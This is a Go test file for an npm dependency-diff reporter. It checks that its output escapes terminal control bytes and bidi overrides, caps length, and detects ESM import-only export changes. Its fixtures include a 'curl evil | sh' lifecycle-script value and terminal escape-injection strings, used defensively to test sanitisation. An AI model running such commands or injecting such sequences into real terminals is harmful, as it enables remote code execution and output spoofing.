package output

// The tests below embed raw control and bidi bytes in string literals on
// purpose, to prove taint() escapes them in output; ST1018 (which suggests
// \u escapes) is exactly the thing under test, so silence it for this file.
//lint:file-ignore ST1018 intentional raw control/bidi bytes in trojan-source fixtures

import (
	"strings"
	"testing"

	"github.com/rvagg/depsound/internal/manifest"
	"github.com/rvagg/depsound/internal/npmpkg"
	"github.com/rvagg/depsound/internal/stats"
)

// Attacker-influenced strings must reach the terminal with C0/C1 control
// bytes and bidi overrides escaped and length capped. Keys are as
// attacker-chosen as values.
func TestTextTaintsHostileStrings(t *testing.T) {
	long := strings.Repeat("A", 5000)
	s := &stats.Stats{
		Package: stats.PkgRef{Ecosystem: "npm", Name: "xname", From: "1", To: "2"},
		Runnable: stats.Runnable{
			// attacker-chosen map KEY, not just value
			Lifecycle: []npmpkg.Change{{Key: "pre\x1b]0;pwn\x07install", Status: "added", To: "curl evil | sh\x1b]0;pwned\x07"}},
		},
		Compat: stats.Compat{TypeFrom: "commonjs", TypeTo: "modu‮le"},
		Dependencies: []npmpkg.DepChange{
			{Section: "dependencies", Name: "bad\x1bdep", Status: "added", To: long},
		},
		Files: stats.FilesSection{
			Flagged: []stats.Flag{{Path: "dist/\x07bell.js", Reason: "minified-looking (long lines)"}},
		},
		Notes: []string{"err: \x1b[2Jwiped"},
	}
	out := Text(s)

	for _, raw := range []string{"\x1b", "\x07", "", "‮"} {
		if strings.Contains(out, raw) {
			t.Errorf("raw control/bidi %q reached output", raw)
		}
	}
	if !strings.Contains(out, `\x1b`) {
		t.Error("control bytes should be visibly escaped")
	}
	if strings.Contains(out, long) {
		t.Error("overlong tainted string not capped")
	}
	if !strings.Contains(out, "...[truncated]") {
		t.Error("truncation not marked")
	}
}

func TestTaint(t *testing.T) {
	if got := taint("normal-string.js"); got != "normal-string.js" {
		t.Errorf("benign string altered: %q", got)
	}
	if got := taint("a\x00b\x7fc"); got != `a\x00b\x7fc` {
		t.Errorf("control escape = %q", got)
	}
	if got := taint(string([]byte{0xff, 0xfe})); strings.ContainsRune(got, 0xff) {
		t.Errorf("invalid UTF-8 leaked: %q", got)
	}
	if got := taint("‮"); got != `\x9b\u202e` {
		t.Errorf("C1/bidi escape = %q", got)
	}
	// truncation must cut at a rune boundary, never mid-rune
	long := strings.Repeat("x", 199) + "日本語"
	got := taint(long)
	if !strings.HasSuffix(got, "...[truncated]") || strings.ContainsRune(got, '�') {
		t.Errorf("rune-boundary truncation broken: %q", got)
	}
}

func TestESMImportOnly(t *testing.T) {
	// commander shape: require flips cjs->esm (require breaks), import remains
	commander := []manifest.ExportChange{
		{Subpath: ".", Condition: "require", From: "./index.js (cjs)", To: "./index.js (esm)"},
		{Subpath: ".", Condition: "import", From: "./esm.mjs (esm)", To: "./index.js (esm)"},
	}
	if !esmImportOnly(commander) {
		t.Error("commander cjs->esm require flip should be ESM import-only")
	}
	// require removed entirely, import remains
	removed := []manifest.ExportChange{
		{Subpath: ".", Condition: "require", From: "./index.js (cjs)", To: ""},
		{Subpath: ".", Condition: "import", From: "", To: "./index.mjs (esm)"},
	}
	if !esmImportOnly(removed) {
		t.Error("require removed should be ESM import-only")
	}
	// dual package (require still resolves to CJS) is NOT import-only
	dual := []manifest.ExportChange{
		{Subpath: ".", Condition: "require", From: "./index.cjs (cjs)", To: "./index.cjs (cjs)"},
		{Subpath: ".", Condition: "import", From: "./index.mjs (esm)", To: "./index.mjs (esm)"},
	}
	if esmImportOnly(dual) {
		t.Error("dual package must not read as ESM import-only")
	}
}
